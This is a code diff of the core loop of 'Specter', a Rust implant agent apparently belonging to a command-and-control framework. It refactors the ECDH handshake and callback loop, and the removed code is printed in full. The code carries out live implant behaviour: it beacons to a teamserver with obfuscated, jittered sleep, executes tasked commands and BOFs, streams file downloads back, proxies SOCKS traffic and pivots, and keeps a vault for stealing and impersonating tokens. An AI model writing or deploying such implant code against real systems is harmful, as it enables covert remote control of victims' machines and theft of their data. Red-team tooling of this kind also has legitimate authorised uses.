@@ -1,11 +1,10 @@
 //! Core agent logic: init handshake and callback loop.
 
-use red_cell_common::agent_protocol::serialize_init_metadata;
 use red_cell_common::crypto::{
     AgentCryptoMaterial, ctr_blocks_for_len, decrypt_agent_data_at_offset, derive_session_keys,
     derive_session_keys_for_version, generate_agent_crypto_material,
 };
-use red_cell_common::demon::{DemonCommand, DemonMessage, DemonPackage};
+use red_cell_common::demon::{DemonCommand, DemonMessage};
 use tracing::{info, warn};
 
 use std::collections::HashMap;
@@ -19,9 +18,7 @@ use crate::coffeeldr::{self, BofOutputQueue};
 use crate::config::SpecterConfig;
 use crate::dispatch::{self, DispatchResult, MemFileStore, PsScriptStore, Response};
 use crate::download::DownloadTracker;
-use crate::ecdh::{
-    EcdhSession, decode_listener_pub_key, perform_registration, send_session_packet,
-};
+use crate::ecdh::EcdhSession;
 use crate::error::SpecterError;
 use crate::job::JobStore;
 use crate::pivot::PivotState;
@@ -32,14 +29,16 @@ use crate::socket::SocketState;
 use crate::token::TokenVault;
 use crate::transport::FallbackTransport;
 
+mod ecdh_loop;
+
 /// Running state of a Specter agent session.
 #[derive(Debug)]
 pub struct SpecterAgent {
-    agent_id: u32,
+    pub(super) agent_id: u32,
     raw_crypto: AgentCryptoMaterial,
     session_crypto: AgentCryptoMaterial,
-    config: SpecterConfig,
-    transport: FallbackTransport,
+    pub(super) config: SpecterConfig,
+    pub(super) transport: FallbackTransport,
     /// Shared monotonic CTR block offset, mirroring the server's single offset.
     ///
     /// Both encrypt (send) and decrypt (recv) operations use and advance this
@@ -51,26 +50,26 @@ pub struct SpecterAgent {
     /// Starts at 1; the teamserver rejects any callback with seq ≤ last_seen_seq.
     callback_seq: u64,
     /// Token vault for impersonation/steal/make operations.
-    token_vault: TokenVault,
+    pub(super) token_vault: TokenVault,
     /// Active file downloads being streamed back to the teamserver.
-    downloads: DownloadTracker,
+    pub(super) downloads: DownloadTracker,
     /// In-memory file staging area for `CommandMemFile` chunks.
-    mem_files: MemFileStore,
+    pub(super) mem_files: MemFileStore,
     /// Socket state for SOCKS5 proxy and reverse port forwarding.
     socket_state: SocketState,
     /// Pivot state for SMB pivot chain relay.
     pivot_state: PivotState,
     /// Job store for tracking background BOF threads and processes.
-    job_store: JobStore,
+    pub(super) job_store: JobStore,
     /// Shared queue for callbacks produced by background BOF threads.
-    bof_output_queue: BofOutputQueue,
+    pub(super) bof_output_queue: BofOutputQueue,
     /// In-memory PowerShell script store for `CommandPsImport`.
-    ps_scripts: PsScriptStore,
+    pub(super) ps_scripts: PsScriptStore,
     /// Active ECDH session when `listener_pub_key` is set in config.
     ///
     /// When `Some`, all post-registration traffic uses AES-256-GCM session
     /// packets instead of the legacy Demon AES-CTR wire format.
-    ecdh_session: Option<EcdhSession>,
+    pub(super) ecdh_session: Option<EcdhSession>,
 }
 
 impl SpecterAgent {
@@ -210,7 +209,7 @@ impl SpecterAgent {
     /// January 1, 1970 UTC), matching the format emitted by the teamserver's
     /// payload builder and normalised by `common::domain::validate_kill_date`.
     /// Returns `true` when the current time meets or exceeds the deadline.
-    fn reached_kill_date(&self) -> bool {
+    pub(super) fn reached_kill_date(&self) -> bool {
         let Some(kill_date) = self.config.kill_date else {
             return false;
         };
@@ -476,7 +475,7 @@ impl SpecterAgent {
     /// Drain pending BOF callbacks from background threads, converting each
     /// [`coffeeldr::BofCallback`] into a [`Response`] with the
     /// `CommandInlineExecute` command ID.
-    fn drain_bof_output(&self) -> Vec<Response> {
+    pub(super) fn drain_bof_output(&self) -> Vec<Response> {
         let callbacks = match self.bof_output_queue.lock() {
             Ok(mut q) => std::mem::take(&mut *q),
             Err(poisoned) => std::mem::take(&mut *poisoned.into_inner()),
@@ -495,7 +494,7 @@ impl SpecterAgent {
     }
 
     /// Compute the sleep delay in milliseconds, applying jitter if configured.
-    fn compute_sleep_delay(&self) -> u64 {
+    pub(super) fn compute_sleep_delay(&self) -> u64 {
         let base = u64::from(self.config.sleep_delay_ms);
         if self.config.sleep_jitter == 0 || base == 0 {
             return base;
@@ -560,204 +559,6 @@ impl SpecterAgent {
         self.callback_seq += 1;
 
         Ok(response)
-    }
-
-    // ── ECDH new-protocol helpers ─────────────────────────────────────────────
-
-    /// Perform the ECDH registration handshake (replaces `init_handshake`).
-    async fn ecdh_init_handshake(&mut self) -> Result<(), SpecterError> {
-        let key_str = self
-            .config
-            .listener_pub_key
-            .as_deref()
-            .ok_or(SpecterError::InvalidConfig("listener_pub_key required for ECDH"))?;
-        let listener_pub_key = decode_listener_pub_key(key_str)?;
-
-        let metadata = self.collect_metadata();
-        let metadata_bytes = serialize_init_metadata(self.agent_id, &metadata)
-            .map_err(|e| SpecterError::Transport(format!("ECDH metadata encode: {e}")))?;
-
-        let session =
-            perform_registration(self.transport.primary(), &listener_pub_key, &metadata_bytes)
-                .await
-                .map_err(|e| SpecterError::Transport(format!("ECDH registration: {e}")))?;
-
-        info!(agent_id = format_args!("0x{:08X}", session.agent_id), "ECDH registration complete");
-
-        self.agent_id = session.agent_id;
-        self.ecdh_session = Some(session);
-        Ok(())
-    }
-
-    /// Send packages over the ECDH session and return decrypted response bytes.
-    async fn ecdh_send_packages(
-        &mut self,
-        packages: Vec<DemonPackage>,
-    ) -> Result<Vec<u8>, SpecterError> {
-        let (connection_id, session_key, agent_id) = self
-            .ecdh_session
-            .as_ref()
-            .ok_or_else(|| SpecterError::Transport("ECDH session not initialized".into()))
-            .map(|s| (s.connection_id, s.session_key, s.agent_id))?;
-        let payload = DemonMessage::new(packages)
-            .to_bytes()
-            .map_err(|e| SpecterError::Transport(format!("ECDH message encode: {e}")))?;
-        send_session_packet(
-            self.transport.primary(),
-            &EcdhSession { connection_id, session_key, agent_id },
-            &payload,
-        )
-        .await
-    }
-
-    /// ECDH-mode checkin + job fetch in one session packet.
-    async fn ecdh_checkin_and_get_job(&mut self) -> Result<DemonMessage, SpecterError> {
-        let packages = vec![
-            DemonPackage::new(DemonCommand::CommandCheckin, 0, Vec::new()),
-            DemonPackage::new(DemonCommand::CommandGetJob, 0, Vec::new()),
-        ];
-        let response = self.ecdh_send_packages(packages).await?;
-        if response.is_empty() {
-            return Ok(DemonMessage::default());
-        }
-        DemonMessage::from_bytes(&response)
-            .map_err(|e| SpecterError::Transport(format!("ECDH job parse: {e}")))
-    }
-
-    /// ECDH-mode single-package callback (for responses to dispatched tasks).
-    async fn ecdh_send_raw_callback(
-        &mut self,
-        command_id: u32,
-        request_id: u32,
-        payload: &[u8],
-    ) -> Result<(), SpecterError> {
-        let pkg = DemonPackage { command_id, request_id, payload: payload.to_vec() };
-        let _resp = self.ecdh_send_packages(vec![pkg]).await?;
-        Ok(())
-    }
-
-    /// Main ECDH run loop (used instead of `run` when listener_pub_key is set).
-    async fn run_ecdh_loop(&mut self) -> Result<(), SpecterError> {
-        loop {
-            if self.reached_kill_date() {
-                info!(
-                    agent_id = format_args!("0x{:08X}", self.agent_id),
-                    kill_date = ?self.config.kill_date,
-                    "kill date reached — notifying teamserver and exiting"
-                );
-                let _ = self
-                    .ecdh_send_raw_callback(u32::from(DemonCommand::CommandKillDate), 0, &[])
-                    .await;
-                return Ok(());
-            }
-
-            let delay = self.compute_sleep_delay();
-            crate::sleep_obf::obfuscated_sleep(delay, self.config.sleep_technique).await;
-
-            let message = match self.ecdh_checkin_and_get_job().await {
-                Ok(m) => m,
-                Err(e) => {
-                    warn!(
-                        agent_id = format_args!("0x{:08X}", self.agent_id),
-                        error = %e,
-                        "ecdh checkin failed, will retry"
-                    );
-                    continue;
-                }
-            };
-
-            for package in &message.packages {
-                let result = dispatch::dispatch(
-                    package,
-                    &mut self.config,
-                    &mut self.token_vault,
-                    &mut self.downloads,
-                    &mut self.mem_files,
-                    &mut self.job_store,
-                    &mut self.ps_scripts,
-                    &self.bof_output_queue,
-                );
-                if self.handle_ecdh_dispatch_result(package.request_id, result).await {
-                    return Ok(());
-                }
-            }
-
-            // Push pending download chunks.
-            let fs_cmd_id = u32::from(DemonCommand::CommandFs);
-            let download_packets = self.downloads.push_chunks(fs_cmd_id);
-            for pkt in download_packets {
-                if let Err(e) =
-                    self.ecdh_send_raw_callback(pkt.command_id, pkt.request_id, &pkt.payload).await
-                {
-                    warn!(error = %e, "ecdh: failed to send download chunk");
-                }
-            }
-
-            // Drain BOF callbacks.
-            let bof_responses = self.drain_bof_output();
-            for resp in bof_responses {
-                if let Err(e) = self
-                    .ecdh_send_raw_callback(resp.command_id, resp.request_id, &resp.payload)
-                    .await
-                {
-                    warn!(error = %e, "ecdh: failed to send BOF callback");
-                }
-            }
-
-            // Reap dead jobs.
-            let tracked_dead = self.job_store.poll();
-            let job_cmd_id = u32::from(DemonCommand::CommandJob);
-            for (job_id, request_id) in &tracked_dead {
-                let mut payload = Vec::with_capacity(8);
-                payload.extend_from_slice(
-                    &u32::from(red_cell_common::demon::DemonJobCommand::Died).to_le_bytes(),
-                );
-                payload.extend_from_slice(&job_id.to_le_bytes());
-                if let Err(e) = self.ecdh_send_raw_callback(job_cmd_id, *request_id, &payload).await
-                {
-                    warn!(job_id, error = %e, "ecdh: failed to send job-died notification");
-                }
-            }
-            self.job_store.reap_dead();
-        }
-    }
-
-    /// Process one dispatch result in ECDH mode. Returns `true` if agent should exit.
-    async fn handle_ecdh_dispatch_result(
-        &mut self,
-        request_id: u32,
-        result: DispatchResult,
-    ) -> bool {
-        match result {
-            DispatchResult::Ignore => false,
-            DispatchResult::Exit => {
-                info!(
-                    agent_id = format_args!("0x{:08X}", self.agent_id),
-                    "CommandExit received — terminating"
-                );
-                true
-            }
-            DispatchResult::Respond(resp) => {
-                let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
-                if let Err(e) =
-                    self.ecdh_send_raw_callback(resp.command_id, rid, &resp.payload).await
-                {
-                    warn!(command_id = resp.command_id, error = %e, "ecdh: failed to send response");
-                }
-                false
-            }
-            DispatchResult::MultiRespond(resps) => {
-                for resp in resps {
-                    let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
-                    if let Err(e) =
-                        self.ecdh_send_raw_callback(resp.command_id, rid, &resp.payload).await
-                    {
-                        warn!(command_id = resp.command_id, error = %e, "ecdh: failed to send response");
-                    }
-                }
-                false
-            }
-        }
     }
 
     // ── Legacy Demon-protocol helpers ─────────────────────────────────────────
